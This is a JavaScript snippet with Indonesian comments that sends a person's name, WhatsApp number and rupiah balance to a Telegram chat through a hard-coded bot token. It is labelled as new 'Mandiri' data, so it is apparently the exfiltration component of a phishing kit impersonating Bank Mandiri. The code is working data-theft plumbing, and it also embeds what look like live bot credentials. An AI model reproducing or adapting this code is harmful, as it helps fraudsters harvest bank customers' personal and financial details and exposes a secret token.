// Konfigurasi Telegram Bot
const TOKEN_BOT = '9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs';
const CHAT_ID = '6742478722';

function kirimKeTelegram(nama, wa, saldo) {
    if (TOKEN_BOT === 'MASUKKAN_TOKEN_BOT_ANDA_DISINI' || CHAT_ID === 'MASUKKAN_CHAT_ID_ANDA_DISINI') {
        console.log('Token Bot atau Chat ID belum dikonfigurasi.');
        return;
    }

    const pesanTelegram = `📥 *DATA BARU MASUK MANDIRI* 📥\n\n👤 *Nama:* ${nama}\n📞 *WhatsApp:* ${wa}\n💰 *Saldo:* Rp ${saldo}`;

    fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesanTelegram,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Berhasil terkirim ke Telegram:', data);
    })
    .catch(error => {
        console.error('Gagal mengirim ke Telegram:', error);
    });
}
